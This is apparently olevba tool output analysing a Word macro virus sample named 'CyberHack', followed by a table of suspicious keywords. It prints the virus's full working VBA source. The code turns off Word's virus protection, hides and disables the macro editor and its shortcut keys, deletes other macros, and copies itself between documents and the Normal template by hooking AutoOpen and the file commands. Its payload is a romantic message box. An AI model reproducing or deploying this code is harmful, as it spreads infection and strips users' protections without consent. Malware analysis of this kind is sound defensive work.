olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-c8ff2c657e09ed00fe9a2d74d22160a7591ebddf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-c8ff2c657e09ed00fe9a2d74d22160a7591ebddf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Guerrero.bas 
in file: Virus.MSWord.CyberHack-based-c8ff2c657e09ed00fe9a2d74d22160a7591ebddf - OLE stream: 'Macros/VBA/Guerrero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "kkk" Then Norok = True
      If (NMacr <> "Guerrero") And (NMacr <> "CyberForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "Guerrero", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=Ad.FullName, _
          Destination:=NT.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To Ad.VBProject.VBComponents.Count
      NMacr = Ad.VBProject.VBComponents(i).Name
      If NMacr = "Guerrero" Then Dokok = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "Guerrero" Then Dokok = True
      If (NMacr <> "Guerrero") And (NMacr <> "CyberForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=Ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "Guerrero", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=Ad.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set Ad = ActiveDocument
    If DokSave = 1 Then
       Ad.SaveAs FileName:=Ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub FileClose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Cyber
    Dialogs(wdDialogFileOpen).Show
    Main
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    CyberForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then CyberForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub

'**************************************
'*Este es un programa diseñado sin un *
'*fin economico, malisioso y molestoso*
'*                                    *
'*       ¡El Fin es Expresar lo que   *
'*       una mujer como ella puede    *
'*       significar en nuestra Vida!  *
'*                                    *
'*         Con cariño Firma Amclobo   *
'**************************************
Sub Main()
A = InputBox("No te asustes, por favor dame tu Nombre", "Ilución")
Do While A = "RAQUEL" Or A = "raquel"
MsgBox "Déjame decirte que me gustas mucho Raquel " + Chr(10) _
        + "no es broma, me pareces una chica simpática" + Chr(10) _
        + "y me gustaría mucho en verdad llegar a conocerte," + Chr(10) _
        + "tu ya me conoces;" + Chr(10) _
        + "Aquí van unas pistas:" + Chr(10) + Chr(10) _
        + "Te conocí en el Centro de Computo" + Chr(10) _
        + "Estudie otra carrera;" + Chr(10) _
        + "Cada vez que nos vemos nos saludamos" + Chr(10) _
        + Chr(10) + Chr(13) _
        + "Con cariño Firma Tu Admirador Secreto" + Chr(10) + Chr(10), , "Solitario Tímido"

End
Loop
MsgBox "No eras la persona que esperaba", , "Solitario Timido"
Tiempo
MsgBox "Este es un programa diseñado sin un" + Chr(10) _
        + "fin economico, malisioso y molestoso" + Chr(10) _
        + "¡El Fin es Expresar lo que" + Chr(10) _
        + "una mujer como ella puede" + Chr(10) _
        + "significar en nuestra Vida!" + Chr(10) + Chr(10) _
        + "Con cariño Firma ANONIMO" + Chr(10) + Chr(10), , "Solitario Timido"
End Sub
Sub Tiempo()
Dim TiempoPausa, Inicio, Final, TiempoTotal

If (MsgBox("Si lo deseas puedes aplicar una pausa en nuestra conversación" + Chr(10) + "Presione Sí para pausarla 50 segundos", 4, "Time")) = vbYes Then
    TiempoPausa = 50 ' Asigna hora de inicio.
    Inicio = Timer  ' Establece la hora de inicio.
    Do While Timer < Inicio + TiempoPausa
        DoEvents    ' Cambia a otros procesos.
    Loop
    Final = Time    ' Asigna hora de finalización.
    TiempoTotal = Final - Inicio    ' Calcula tiempo total.
    MsgBox "Detenida durante " & TiempoTotal & " segundos", vbExclamation, "Locura Time"
End If
    
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

